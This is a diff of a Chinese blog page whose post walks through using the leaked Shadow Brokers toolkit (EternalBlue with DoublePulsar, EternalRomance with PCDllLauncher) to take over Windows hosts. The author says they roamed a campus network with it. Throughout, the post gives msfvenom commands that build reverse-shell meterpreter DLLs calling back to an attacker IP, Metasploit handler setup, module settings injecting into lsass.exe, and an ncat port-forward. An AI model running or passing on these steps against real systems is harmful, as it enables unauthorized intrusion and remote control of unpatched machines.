@@ -21,7 +21,7 @@ Eternalblue &#43; Doublepulsar use Eternalblue 中间按照提示填入相应的
 <meta property='og:site_name' content='wrfly&#39;s blog'>
 <meta property='og:type' content='article'><meta property='article:section' content='posts'><meta property='article:tag' content='code'><meta property='article:published_time' content='2017-04-16T00:00:00Z'/><meta property='article:modified_time' content='2017-04-16T00:00:00Z'/><meta name='twitter:card' content='summary'>
 
-<meta name="generator" content="Hugo 0.57.2" />
+<meta name="generator" content="Hugo 0.68.3" />
 
   <title>shadowbroker大杀器 • wrfly&#39;s blog</title>
   <link rel='canonical' href='https://wrfly.kfd.me/posts/shadowbroker%E5%A4%A7%E6%9D%80%E5%99%A8/'>
@@ -113,20 +113,13 @@ if (!doNotTrack) {
   
 
   <div class='container entry-content'>
-  
-
-<p>搞了两天，弄出个差不多的套路，漫游了一波校园网。</p>
-
+  <p>搞了两天，弄出个差不多的套路，漫游了一波校园网。</p>
 <p>环境要求： <code>python2.6</code> + <code>pywin32</code> 扩展包</p>
-
 <p>将 <code>windows/lib/</code> 下对应的的<code>dll</code>目录添加到系统环境变量里面，还要把 <code>pytrch.py</code> 和 <code>_pytrch</code> 都放到python的扩展包里面，否则运行 <code>fb.py</code> 会报错。</p>
-
 <p>然后运行 <code>fb.py</code></p>
-
 <p>两个可用套路：</p>
-
-<h3 id="eternalblue-doublepulsar">Eternalblue + Doublepulsar</h3>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">use Eternalblue
+<h3 id="eternalblue--doublepulsar">Eternalblue + Doublepulsar</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">use Eternalblue
 
 中间按照提示填入相应的IP和端口信息
 
@@ -159,17 +152,18 @@ ProcessName           lsass.exe
 ProcessCommandLine
 Protocol              SMB
 Architecture          x64
-Function              RunDLL</pre></div>
-<p>这里记录一下这个 dll 是怎么生成的：</p>
+Function              RunDLL
+
+</code></pre></div><p>这里记录一下这个 dll 是怎么生成的：</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># target是32位系统</span>
 msfvenom -p windows/meterpreter/reverse_tcp <span style="color:#ae81ff">\
-</span><span style="color:#ae81ff"></span>    LHOSTT<span style="color:#f92672">=</span><span style="color:#ae81ff">10</span>.170.4.114 <span style="color:#ae81ff">\
+</span><span style="color:#ae81ff"></span>    LHOSTT<span style="color:#f92672">=</span>10.170.4.114 <span style="color:#ae81ff">\
 </span><span style="color:#ae81ff"></span>    LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">8888</span> <span style="color:#ae81ff">\
 </span><span style="color:#ae81ff"></span>    -f dll &gt; go.dll
 
 <span style="color:#75715e"># target是64位系统</span>
 msfvenom -p windows/x64/meterpreter/reverse_tcp <span style="color:#ae81ff">\
-</span><span style="color:#ae81ff"></span>    LHOSTT<span style="color:#f92672">=</span><span style="color:#ae81ff">10</span>.170.4.114 <span style="color:#ae81ff">\
+</span><span style="color:#ae81ff"></span>    LHOSTT<span style="color:#f92672">=</span>10.170.4.114 <span style="color:#ae81ff">\
 </span><span style="color:#ae81ff"></span>    LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">8888</span> <span style="color:#ae81ff">\
 </span><span style="color:#ae81ff"></span>    -f dll &gt; go.dll
 
@@ -178,14 +172,15 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp <span style="color:#ae81ff">\
 msf &gt; use exploit/multi/handler 
 msf exploit<span style="color:#f92672">(</span>handler<span style="color:#f92672">)</span> &gt; set payload windows/meterpreter/reverse_tcp
 payload <span style="color:#f92672">=</span>&gt; windows/meterpreter/reverse_tcp
-msf exploit<span style="color:#f92672">(</span>handler<span style="color:#f92672">)</span> &gt; set LHOST <span style="color:#ae81ff">10</span>.170.4.114
-LHOST <span style="color:#f92672">=</span>&gt; <span style="color:#ae81ff">10</span>.170.4.114
+msf exploit<span style="color:#f92672">(</span>handler<span style="color:#f92672">)</span> &gt; set LHOST 10.170.4.114
+LHOST <span style="color:#f92672">=</span>&gt; 10.170.4.114
 msf exploit<span style="color:#f92672">(</span>handler<span style="color:#f92672">)</span> &gt; set LPORT <span style="color:#ae81ff">8888</span>
 LPORT <span style="color:#f92672">=</span>&gt; <span style="color:#ae81ff">8888</span>
 
 <span style="color:#75715e"># 然后 run 就可以了</span>
-<span style="color:#75715e"># 需要注意的是，要先run起来，然后在从 fb.py 这边 execute</span></code></pre></div>
-<h3 id="eternalromence-pcdlllauncher">Eternalromence + Pcdlllauncher</h3>
+<span style="color:#75715e"># 需要注意的是，要先run起来，然后在从 fb.py 这边 execute</span>
+
+</code></pre></div><h3 id="eternalromence--pcdlllauncher">Eternalromence + Pcdlllauncher</h3>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">use Eternalromance
 
 ...
@@ -198,10 +193,10 @@ Module: Eternalromance
 Name                 Value
 ----                 -----
 NetworkTimeout       <span style="color:#ae81ff">60</span>
-TargetIp             <span style="color:#ae81ff">10</span>.168.55.50
+TargetIp             10.168.55.50
 TargetPort           <span style="color:#ae81ff">445</span>
 PipeName
-CallbackIp           <span style="color:#ae81ff">10</span>.170.4.114
+CallbackIp           10.170.4.114
 CallbackPort         <span style="color:#ae81ff">45213</span>
 CallbackLocalPort    <span style="color:#ae81ff">45213</span>
 ExploitMethod        Default
@@ -230,7 +225,7 @@ fb Exploit <span style="color:#f92672">(</span>Eternalromance<span style="color:
 <span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Entering Plugin Context :: Namedpipetouch
 <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Applying Global Variables
 <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Set NetworkTimeout <span style="color:#f92672">=</span>&gt; <span style="color:#ae81ff">60</span>
-<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Set TargetIp <span style="color:#f92672">=</span>&gt; <span style="color:#ae81ff">10</span>.168.55.50
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Set TargetIp <span style="color:#f92672">=</span>&gt; 10.168.55.50
 
 fb Touch <span style="color:#f92672">(</span>Namedpipetouch<span style="color:#f92672">)</span> &gt; set
 
@@ -240,7 +235,7 @@ Module: Namedpipetouch
 Name              Value
 ----              -----
 NetworkTimeout    <span style="color:#ae81ff">60</span>
-TargetIp          <span style="color:#ae81ff">10</span>.168.55.50
+TargetIp          10.168.55.50
 TargetPort        <span style="color:#ae81ff">445</span>
 Protocol          SMB
 
@@ -277,13 +272,10 @@ PCBehavior              <span style="color:#ae81ff">8</span>
 
 <span style="color:#75715e"># LPFilename 搜一下PC_Exploit.dll的位置，填上</span>
 <span style="color:#75715e"># ImplantFilename 就是上一个套路中的 go.dll or go_64.dll</span>
-<span style="color:#75715e"># 配置好参数以后，从msf这边监听着。</span></code></pre></div>
-<h3 id="more">More</h3>
-
+<span style="color:#75715e"># 配置好参数以后，从msf这边监听着。</span>
+</code></pre></div><h3 id="more">More</h3>
 <p>还有一件比较重要的事情，因为xp都是开在虚拟机里的，CallBack这里就需要一个端口转发，端口转发的方法有很多，推荐使用ncat：</p>
-
 <p><code>ncat --sh-exec &quot;ncat 192.168.56.102 45213&quot; -lkp 45213</code></p>
-
 <p>其中，<code>192.168.56.102</code>是虚拟机的IP</p>
 
 </div>
